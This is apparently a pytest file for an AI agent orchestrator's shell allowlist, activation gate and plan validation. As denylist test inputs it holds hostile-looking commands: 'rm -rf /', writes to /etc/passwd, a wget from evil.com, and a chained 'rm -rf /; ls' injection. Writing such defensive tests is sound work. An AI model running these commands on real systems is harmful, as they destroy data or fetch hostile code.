"""Tests for Phase 7.22 — System Report Activation Gate and Shell Allowlist.

Covers:
  - Shell allowlist validation (allow/deny/edge cases)
  - Activation gate criteria evaluation
  - Decision logic (ready / block)
  - Activation and deactivation mechanics
  - Orchestrator routing for system_report
  - Plan validation for system_report
  - No-scope-expansion safety checks
"""

import json
import os
import tempfile
from pathlib import Path
from unittest.mock import patch

import pytest

# Ensure project root is importable
import sys
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from tools.task_classifier import (
    validate_system_shell_command,
    SYSTEM_SHELL_ALLOWLIST,
    SYSTEM_SHELL_DENYLIST,
)
from agents.rollout_gate import (
    SystemReportActivationGate,
    evaluate_system_report_activation,
    decide_system_report_activation,
    activate_system_report_scope,
    deactivate_system_report_scope,
    write_system_report_activation_gate,
    _verify_shell_enforcement,
    REPORT_REQUIRED_BROADER_DECISION,
)
from tools.orchestrator_adapter import (
    _build_stageD_report_steps,
    validate_stageD_report_plan,
    validate_stageD_plan,
    _get_system_scope,
    _STAGE_D_REPORT_ALLOWED_SKILLS,
    _STAGE_D_REPORT_BLOCKED_SKILLS,
)
from planner.schemas import ExecutionPlan, PlanStep


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_temp_repo():
    """Create a temp directory with minimal Nova-Core state structure."""
    tmp = tempfile.mkdtemp()
    root = Path(tmp)

    # STATE dirs
    (root / "STATE" / "config").mkdir(parents=True)
    (root / "STATE" / "workflows").mkdir(parents=True)
    (root / "WORK").mkdir(parents=True)
    (root / "LOGS").mkdir(parents=True)

    return root


def _write_feature_flags(root, system_scope="inspect_only", extra=None):
    """Write minimal feature_flags.json."""
    orch = {
        "enabled": True,
        "supported_classes": ["research", "code_review", "code_impl", "system"],
        "stage": "D",
        "rollout_stage": "stage4_research_code_review_code_impl_system_inspect",
        "system_scope": system_scope,
        "system_allowed_skills": [
            "file-ops", "http-fetch", "reading-obsidian-memory",
            "self-verification", "web-research",
        ],
        "system_blocked_skills": ["git-ops", "shell-ops", "task-execution"],
        "min_confidence": 0.5,
    }
    if extra:
        orch.update(extra)
    data = {"phase7_orchestrator": orch, "version": 8, "updated_at": "2026-03-08T14:33:13Z"}
    (root / "STATE" / "config" / "feature_flags.json").write_text(
        json.dumps(data, indent=2) + "\n"
    )
    return data


def _write_heartbeat(root, overall="healthy"):
    (root / "STATE" / "heartbeat_multiagent.json").write_text(
        json.dumps({
            "overall": overall,
            "metrics": {
                "budget_exhaustion_count": 0,
                "policy_violation_count": 0,
            },
        }) + "\n"
    )


def _write_broader_scope(root, decision="ready_for_broader_system_scope_planning"):
    (root / "STATE" / "broader_system_scope_evaluation.json").write_text(
        json.dumps({"decision": decision}) + "\n"
    )


def _write_activation_log(root, entries=None):
    path = root / "STATE" / "activation_log.jsonl"
    if entries:
        with open(path, "w") as f:
            for e in entries:
                f.write(json.dumps(e) + "\n")


def _make_ready_repo():
    """Create a repo where all activation criteria pass."""
    root = _make_temp_repo()
    _write_feature_flags(root)
    _write_heartbeat(root)
    _write_broader_scope(root)
    _write_activation_log(root, [
        {"event": "stage_D_activation", "stage": "D", "timestamp": "2026-03-08T14:33:13Z"},
    ])
    return root


def _all_pass_kwargs():
    """Return kwargs for evaluate_system_report_activation where all pass."""
    return {
        "broader_scope_decision": "ready_for_broader_system_scope_planning",
        "heartbeat_overall": "healthy",
        "policy_violations": 0,
        "budget_exhaustions": 0,
        "unresolved_recovery_anomalies": 0,
        "shell_enforcement_verified": True,
        "stageD_rollback_count": 0,
        "stage": "stage4_research_code_review_code_impl_system_inspect",
        "system_in_classes": True,
    }


# ============================================================================
# Shell Allowlist Validation Tests
# ============================================================================

class TestShellAllowlist:
    """Test validate_system_shell_command."""

    def test_ps_aux_allowed(self):
        ok, reason = validate_system_shell_command("ps aux")
        assert ok
        assert "allowed" in reason

    def test_df_h_allowed(self):
        ok, _ = validate_system_shell_command("df -h")
        assert ok

    def test_free_h_allowed(self):
        ok, _ = validate_system_shell_command("free -h")
        assert ok

    def test_uptime_allowed(self):
        ok, _ = validate_system_shell_command("uptime")
        assert ok

    def test_systemctl_status_allowed(self):
        ok, _ = validate_system_shell_command("systemctl status novacore-watcher")
        assert ok

    def test_journalctl_allowed(self):
        ok, _ = validate_system_shell_command("journalctl --no-pager -n 50")
        assert ok

    def test_cat_proc_loadavg_allowed(self):
        ok, _ = validate_system_shell_command("cat /proc/loadavg")
        assert ok

    def test_hostname_allowed(self):
        ok, _ = validate_system_shell_command("hostname")
        assert ok

    def test_uname_allowed(self):
        ok, _ = validate_system_shell_command("uname -a")
        assert ok

    def test_ls_la_allowed(self):
        ok, _ = validate_system_shell_command("ls -la /tmp")
        assert ok

    def test_curl_localhost_allowed(self):
        ok, _ = validate_system_shell_command("curl -sf http://localhost:8080/health")
        assert ok

    def test_du_sh_allowed(self):
        ok, _ = validate_system_shell_command("du -sh /var/log")
        assert ok

    def test_ss_allowed(self):
        ok, _ = validate_system_shell_command("ss -tlnp")
        assert ok


class TestShellDenylist:
    """Test that dangerous commands are denied."""

    def test_rm_denied(self):
        ok, reason = validate_system_shell_command("rm -rf /")
        assert not ok
        assert "denied" in reason

    def test_sudo_denied(self):
        ok, _ = validate_system_shell_command("sudo apt update")
        assert not ok

    def test_systemctl_restart_denied(self):
        ok, _ = validate_system_shell_command("systemctl restart novacore-watcher")
        assert not ok

    def test_kill_denied(self):
        ok, _ = validate_system_shell_command("kill -9 1234")
        assert not ok

    def test_pip_install_denied(self):
        ok, _ = validate_system_shell_command("pip install malware")
        assert not ok

    def test_apt_denied(self):
        ok, _ = validate_system_shell_command("apt-get install something")
        assert not ok

    def test_redirect_denied(self):
        ok, _ = validate_system_shell_command("echo test > /etc/passwd")
        assert not ok

    def test_tee_denied(self):
        ok, _ = validate_system_shell_command("tee /etc/passwd")
        assert not ok

    def test_sed_i_denied(self):
        ok, _ = validate_system_shell_command("sed -i 's/foo/bar/' config.txt")
        assert not ok

    def test_reboot_denied(self):
        ok, _ = validate_system_shell_command("reboot")
        assert not ok

    def test_shutdown_denied(self):
        ok, _ = validate_system_shell_command("shutdown -h now")
        assert not ok

    def test_chmod_denied(self):
        ok, _ = validate_system_shell_command("chmod 777 /tmp/file")
        assert not ok

    def test_git_push_denied(self):
        ok, _ = validate_system_shell_command("git push origin main")
        assert not ok

    def test_pkill_denied(self):
        ok, _ = validate_system_shell_command("pkill -9 novacore")
        assert not ok

    def test_mv_denied(self):
        ok, _ = validate_system_shell_command("mv /etc/hosts /etc/hosts.bak")
        assert not ok


class TestShellEdgeCases:
    """Edge cases for shell validation."""

    def test_empty_command_denied(self):
        ok, reason = validate_system_shell_command("")
        assert not ok
        assert "empty" in reason

    def test_whitespace_only_denied(self):
        ok, _ = validate_system_shell_command("   ")
        assert not ok

    def test_unknown_command_denied(self):
        ok, reason = validate_system_shell_command("wget http://evil.com/malware")
        assert not ok
        assert "not_in_allowlist" in reason

    def test_denylist_wins_over_allowlist(self):
        """If a command matches both allow and deny, deny wins."""
        # 'ls -la ' is allowed, but 'rm ' in the command should deny
        ok, _ = validate_system_shell_command("rm -rf /; ls -la /")
        assert not ok

    def test_systemctl_status_vs_restart(self):
        """systemctl status is allowed, restart is denied."""
        ok1, _ = validate_system_shell_command("systemctl status sshd")
        ok2, _ = validate_system_shell_command("systemctl restart sshd")
        assert ok1
        assert not ok2


# ============================================================================
# Activation Gate Criteria Tests
# ============================================================================

class TestActivationGateCriteria:
    """Test evaluate_system_report_activation criteria."""

    def test_all_criteria_pass(self):
        criteria = evaluate_system_report_activation(**_all_pass_kwargs())
        assert all(c.passed for c in criteria)

    def test_criteria_count(self):
        criteria = evaluate_system_report_activation(**_all_pass_kwargs())
        assert len(criteria) == 9

    def test_all_hard_severity(self):
        criteria = evaluate_system_report_activation(**_all_pass_kwargs())
        assert all(c.severity == "hard" for c in criteria)

    def test_broader_scope_not_ready_blocks(self):
        kwargs = _all_pass_kwargs()
        kwargs["broader_scope_decision"] = "hold_broader_system_scope"
        criteria = evaluate_system_report_activation(**kwargs)
        c = next(c for c in criteria if c.name == "broader_scope_ready")
        assert not c.passed

    def test_unhealthy_heartbeat_blocks(self):
        kwargs = _all_pass_kwargs()
        kwargs["heartbeat_overall"] = "unhealthy"
        criteria = evaluate_system_report_activation(**kwargs)
        c = next(c for c in criteria if c.name == "heartbeat_healthy")
        assert not c.passed

    def test_policy_violation_blocks(self):
        kwargs = _all_pass_kwargs()
        kwargs["policy_violations"] = 1
        criteria = evaluate_system_report_activation(**kwargs)
        c = next(c for c in criteria if c.name == "no_policy_violations")
        assert not c.passed

    def test_budget_exhaustion_blocks(self):
        kwargs = _all_pass_kwargs()
        kwargs["budget_exhaustions"] = 1
        criteria = evaluate_system_report_activation(**kwargs)
        c = next(c for c in criteria if c.name == "no_budget_exhaustions")
        assert not c.passed

    def test_unresolved_recovery_blocks(self):
        kwargs = _all_pass_kwargs()
        kwargs["unresolved_recovery_anomalies"] = 1
        criteria = evaluate_system_report_activation(**kwargs)
        c = next(c for c in criteria if c.name == "no_recovery_anomalies")
        assert not c.passed

    def test_shell_not_verified_blocks(self):
        kwargs = _all_pass_kwargs()
        kwargs["shell_enforcement_verified"] = False
        criteria = evaluate_system_report_activation(**kwargs)
        c = next(c for c in criteria if c.name == "shell_enforcement_verified")
        assert not c.passed

    def test_stageD_rollback_blocks(self):
        kwargs = _all_pass_kwargs()
        kwargs["stageD_rollback_count"] = 1
        criteria = evaluate_system_report_activation(**kwargs)
        c = next(c for c in criteria if c.name == "no_stageD_rollback_history")
        assert not c.passed

    def test_wrong_stage_blocks(self):
        kwargs = _all_pass_kwargs()
        kwargs["stage"] = "stage3_foo"
        criteria = evaluate_system_report_activation(**kwargs)
        c = next(c for c in criteria if c.name == "stage_is_D")
        assert not c.passed

    def test_system_not_in_classes_blocks(self):
        kwargs = _all_pass_kwargs()
        kwargs["system_in_classes"] = False
        criteria = evaluate_system_report_activation(**kwargs)
        c = next(c for c in criteria if c.name == "system_class_active")
        assert not c.passed


# ============================================================================
# Decision Logic Tests
# ============================================================================

class TestDecisionLogic:
    """Test decide_system_report_activation."""

    def test_all_pass_ready(self):
        criteria = evaluate_system_report_activation(**_all_pass_kwargs())
        decision, _ = decide_system_report_activation(criteria)
        assert decision == "ready_to_activate_system_report"

    def test_single_failure_blocks(self):
        kwargs = _all_pass_kwargs()
        kwargs["heartbeat_overall"] = "unhealthy"
        criteria = evaluate_system_report_activation(**kwargs)
        decision, next_action = decide_system_report_activation(criteria)
        assert decision == "block_system_report_activation"
        assert "heartbeat_healthy" in next_action

    def test_multiple_failures_blocks(self):
        kwargs = _all_pass_kwargs()
        kwargs["heartbeat_overall"] = "unhealthy"
        kwargs["policy_violations"] = 1
        criteria = evaluate_system_report_activation(**kwargs)
        decision, next_action = decide_system_report_activation(criteria)
        assert decision == "block_system_report_activation"
        assert "heartbeat_healthy" in next_action
        assert "no_policy_violations" in next_action

    def test_next_action_ready_mentions_allowlist(self):
        criteria = evaluate_system_report_activation(**_all_pass_kwargs())
        _, next_action = decide_system_report_activation(criteria)
        assert "allowlist" in next_action


# ============================================================================
# Shell Enforcement Verification Tests
# ============================================================================

class TestShellEnforcementVerification:
    """Test _verify_shell_enforcement smoke tests."""

    def test_verification_passes(self):
        assert _verify_shell_enforcement() is True


# ============================================================================
# Activation / Deactivation Tests
# ============================================================================

class TestActivation:
    """Test activate_system_report_scope and deactivate_system_report_scope."""

    def test_activation_succeeds_when_ready(self):
        root = _make_ready_repo()
        success, msg, record = activate_system_report_scope(root)
        assert success, msg
        assert "report" in msg

        # Verify feature flags updated
        data = json.loads((root / "STATE" / "config" / "feature_flags.json").read_text())
        orch = data["phase7_orchestrator"]
        assert orch["system_scope"] == "report"
        assert "shell-ops" in orch["system_allowed_skills"]
        assert "shell-ops" not in orch["system_blocked_skills"]
        assert "system_report" in orch["rollout_stage"]

    def test_activation_blocked_when_not_ready(self):
        root = _make_ready_repo()
        _write_broader_scope(root, decision="hold_broader_system_scope")
        success, msg, record = activate_system_report_scope(root)
        assert not success
        assert "blocked" in msg.lower() or "Activation blocked" in msg

    def test_activation_records_in_log(self):
        root = _make_ready_repo()
        activate_system_report_scope(root)
        log = (root / "STATE" / "activation_log.jsonl").read_text().strip().split("\n")
        last = json.loads(log[-1])
        assert last["event"] == "system_report_activation"
        assert last["phase"] == "7.22"

    def test_activation_bumps_version(self):
        root = _make_ready_repo()
        pre_data = json.loads((root / "STATE" / "config" / "feature_flags.json").read_text())
        pre_version = pre_data["version"]
        activate_system_report_scope(root)
        post_data = json.loads((root / "STATE" / "config" / "feature_flags.json").read_text())
        assert post_data["version"] == pre_version + 1

    def test_activation_fails_if_not_inspect_only(self):
        root = _make_ready_repo()
        _write_feature_flags(root, system_scope="report")
        _write_broader_scope(root)
        success, msg, _ = activate_system_report_scope(root)
        assert not success
        assert "inspect_only" in msg

    def test_deactivation_after_activation(self):
        root = _make_ready_repo()
        activate_system_report_scope(root)

        success, msg = deactivate_system_report_scope(root, reason="test_rollback")
        assert success
        assert "inspect_only" in msg

        data = json.loads((root / "STATE" / "config" / "feature_flags.json").read_text())
        orch = data["phase7_orchestrator"]
        assert orch["system_scope"] == "inspect_only"
        assert "shell-ops" not in orch["system_allowed_skills"]
        assert "shell-ops" in orch["system_blocked_skills"]

    def test_deactivation_fails_if_not_report(self):
        root = _make_ready_repo()
        # Don't activate — scope is still inspect_only
        success, msg = deactivate_system_report_scope(root)
        assert not success
        assert "report" in msg

    def test_deactivation_records_in_log(self):
        root = _make_ready_repo()
        activate_system_report_scope(root)
        deactivate_system_report_scope(root, reason="test_rollback")
        log = (root / "STATE" / "activation_log.jsonl").read_text().strip().split("\n")
        last = json.loads(log[-1])
        assert last["event"] == "system_report_deactivation"
        assert last["reason"] == "test_rollback"


# ============================================================================
# Orchestrator Routing Tests
# ============================================================================

class TestOrchestratorRouting:
    """Test system_report plan building and validation."""

    def test_report_steps_include_shell_ops(self):
        steps = _build_stageD_report_steps("test_task", "inspect system health")
        skill_names = [s.skill_name for s in steps]
        assert "shell-ops" in skill_names

    def test_report_steps_include_verifier(self):
        steps = _build_stageD_report_steps("test_task", "inspect system health")
        skill_names = [s.skill_name for s in steps]
        assert "self-verification" in skill_names

    def test_report_steps_have_shell_scope(self):
        steps = _build_stageD_report_steps("test_task", "inspect system health")
        shell_step = next(s for s in steps if s.skill_name == "shell-ops")
        assert shell_step.inputs.get("shell_scope") == "system_report_allowlist"

    def test_report_steps_count(self):
        steps = _build_stageD_report_steps("test_task", "inspect system health")
        assert len(steps) == 4  # inspect, diagnose, report, verify

    def test_report_plan_validates(self):
        steps = _build_stageD_report_steps("test_task", "inspect system health")
        plan = ExecutionPlan(
            plan_id="test_plan",
            task_id="test_task",
            strategy="stageD_system_report",
            steps=steps,
            success_criteria=["test"],
        )
        valid, reason = validate_stageD_report_plan(plan)
        assert valid, reason

    def test_inspect_plan_rejects_shell_ops(self):
        """A pure inspect plan should reject shell-ops."""
        steps = [
            PlanStep(step_id="s1", skill_name="shell-ops", goal="run shell", inputs={}),
            PlanStep(step_id="s2", skill_name="self-verification", goal="verify", inputs={}),
        ]
        plan = ExecutionPlan(plan_id="test", task_id="t", strategy="s", steps=steps, success_criteria=["t"])
        valid, reason = validate_stageD_plan(plan)
        assert not valid
        assert "blocked_skill:shell-ops" in reason

    def test_report_plan_rejects_git_ops(self):
        """Report plan should still block git-ops."""
        steps = [
            PlanStep(step_id="s1", skill_name="git-ops", goal="push", inputs={}),
            PlanStep(step_id="s2", skill_name="self-verification", goal="verify", inputs={}),
        ]
        plan = ExecutionPlan(plan_id="test", task_id="t", strategy="s", steps=steps, success_criteria=["t"])
        valid, reason = validate_stageD_report_plan(plan)
        assert not valid
        assert "blocked_skill:git-ops" in reason

    def test_report_plan_rejects_missing_shell_scope(self):
        """Report plan requires shell_scope on shell-ops steps."""
        steps = [
            PlanStep(step_id="s1", skill_name="shell-ops", goal="run", inputs={}),
            PlanStep(step_id="s2", skill_name="self-verification", goal="verify", inputs={}),
        ]
        plan = ExecutionPlan(plan_id="test", task_id="t", strategy="s", steps=steps, success_criteria=["t"])
        valid, reason = validate_stageD_report_plan(plan)
        assert not valid
        assert "shell_step_missing_allowlist_scope" in reason

    def test_report_plan_rejects_missing_verifier(self):
        steps = [
            PlanStep(step_id="s1", skill_name="file-ops", goal="read", inputs={}),
        ]
        plan = ExecutionPlan(plan_id="test", task_id="t", strategy="s", steps=steps, success_criteria=["t"])
        valid, reason = validate_stageD_report_plan(plan)
        assert not valid
        assert "missing_mandatory_verifier" in reason


class TestGetSystemScope:
    """Test _get_system_scope helper."""

    def test_from_routing_dict(self):
        routing = {"feature_flags": {"system_scope": "report"}}
        assert _get_system_scope(routing) == "report"

    def test_default_inspect_only(self):
        routing = {"feature_flags": {}}
        assert _get_system_scope(routing) == "inspect_only"

    def test_none_routing(self):
        # Falls back to disk read or default
        scope = _get_system_scope(None)
        assert scope in ("inspect_only", "report")  # depends on live config


# ============================================================================
# Skill Set Tests
# ============================================================================

class TestSkillSets:
    """Verify report skill sets are correct supersets of inspect."""

    def test_report_superset_of_inspect(self):
        from tools.orchestrator_adapter import _STAGE_D_ALLOWED_SKILLS
        assert _STAGE_D_ALLOWED_SKILLS.issubset(_STAGE_D_REPORT_ALLOWED_SKILLS)

    def test_report_adds_shell_ops(self):
        from tools.orchestrator_adapter import _STAGE_D_ALLOWED_SKILLS
        diff = _STAGE_D_REPORT_ALLOWED_SKILLS - _STAGE_D_ALLOWED_SKILLS
        assert diff == {"shell-ops"}

    def test_report_still_blocks_git_ops(self):
        assert "git-ops" in _STAGE_D_REPORT_BLOCKED_SKILLS

    def test_report_still_blocks_task_execution(self):
        assert "task-execution" in _STAGE_D_REPORT_BLOCKED_SKILLS


# ============================================================================
# Artifact Generation Tests
# ============================================================================

class TestArtifactGeneration:
    """Test write_system_report_activation_gate."""

    def test_ready_artifacts(self):
        root = _make_temp_repo()
        criteria = evaluate_system_report_activation(**_all_pass_kwargs())
        decision, next_action = decide_system_report_activation(criteria)
        gate = SystemReportActivationGate(
            decision=decision,
            criteria=criteria,
            evidence_summary={"test": True},
            generated_at="2026-03-08T22:00:00Z",
            next_action=next_action,
        )
        md_path, json_path = write_system_report_activation_gate(gate, root)
        assert md_path.exists()
        assert json_path.exists()

        md_text = md_path.read_text()
        assert "READY" in md_text
        assert "activate_system_report_scope" in md_text

    def test_blocked_artifacts(self):
        root = _make_temp_repo()
        kwargs = _all_pass_kwargs()
        kwargs["heartbeat_overall"] = "unhealthy"
        criteria = evaluate_system_report_activation(**kwargs)
        decision, next_action = decide_system_report_activation(criteria)
        gate = SystemReportActivationGate(
            decision=decision,
            criteria=criteria,
            evidence_summary={"test": True},
            generated_at="2026-03-08T22:00:00Z",
            next_action=next_action,
        )
        md_path, json_path = write_system_report_activation_gate(gate, root)
        md_text = md_path.read_text()
        assert "BLOCKED" in md_text

    def test_json_roundtrip(self):
        root = _make_temp_repo()
        criteria = evaluate_system_report_activation(**_all_pass_kwargs())
        decision, next_action = decide_system_report_activation(criteria)
        gate = SystemReportActivationGate(
            decision=decision,
            criteria=criteria,
            evidence_summary={"broader_scope": "ready"},
            generated_at="2026-03-08T22:00:00Z",
            next_action=next_action,
        )
        _, json_path = write_system_report_activation_gate(gate, root)
        data = json.loads(json_path.read_text())
        assert data["decision"] == "ready_to_activate_system_report"
        assert len(data["criteria"]) == 9


# ============================================================================
# Integration Test
# ============================================================================

class TestIntegration:
    """End-to-end integration with temp repo."""

    def test_full_review_and_activation_cycle(self):
        root = _make_ready_repo()

        # Review gate
        gate = None
        from agents.rollout_gate import review_system_report_activation
        gate = review_system_report_activation(root)
        assert gate.decision == "ready_to_activate_system_report"

        # Write artifacts
        md_path, json_path = write_system_report_activation_gate(gate, root)
        assert md_path.exists()
        assert json_path.exists()

        # Activate
        success, msg, record = activate_system_report_scope(root)
        assert success, msg

        # Verify post-activation state
        data = json.loads((root / "STATE" / "config" / "feature_flags.json").read_text())
        assert data["phase7_orchestrator"]["system_scope"] == "report"

        # Deactivate
        success, msg = deactivate_system_report_scope(root)
        assert success

        # Verify rollback
        data = json.loads((root / "STATE" / "config" / "feature_flags.json").read_text())
        assert data["phase7_orchestrator"]["system_scope"] == "inspect_only"

    def test_blocked_review_prevents_activation(self):
        root = _make_ready_repo()
        _write_heartbeat(root, overall="unhealthy")

        from agents.rollout_gate import review_system_report_activation
        gate = review_system_report_activation(root)
        assert gate.decision == "block_system_report_activation"

        # Try to activate (should fail because gate runs inside)
        success, _, _ = activate_system_report_scope(root)
        assert not success
